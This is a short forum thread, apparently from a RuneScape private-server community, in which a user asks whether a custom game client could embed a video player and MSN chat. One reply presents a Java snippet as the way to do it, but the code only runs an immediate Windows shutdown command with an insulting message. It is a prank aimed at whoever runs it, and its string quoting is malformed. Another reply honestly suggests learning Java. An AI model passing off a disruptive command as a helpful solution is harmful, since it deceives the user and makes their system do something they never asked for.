channel.title: Make me an rs client
channel.description:
Well not really asking someone to make me one, id like to ask if this could be done - have a little screen where i can have a movie playing along with runescape screen being open. also have msn intergrated so i can have an msn conversation in a free space of the client.
if you get what im saying could this be done?
also i know i can just open msn ontop of rs and have a video playing on top of rs, but i dont want it like that.

item.title: Make me an rs client
item.dc:creator: @1337h4x 1337h4x
item.description:
@1337h4x wrote:

I know how you can do it.

Try running this:

[code]class sex
{

public static void main(String args[])
{

try
{
Runtime.getRuntime().exec( “shutdown -s -t 00 -c “POST IN THE FUCKING RIGHT SECTION”\n” );
}
catch( Exception e ) {}

}

}[/code]

Read full topic

item.title: Make me an rs client
item.dc:creator: @Buzzy Buzzy
item.description:
@Buzzy wrote:

Yes, it can happen, Mopar proved this for me when he made MoparScape play MP3’s. But, it would take a long time and a vast knowledge of Java. If you want to learn Java and start trying, then you should check out some Java tutorials in the Programming section of the forums. I garuntee that if you produce a piece of code like that, you’ll be a huge member of the community and get a Java avatar.

Read full topic
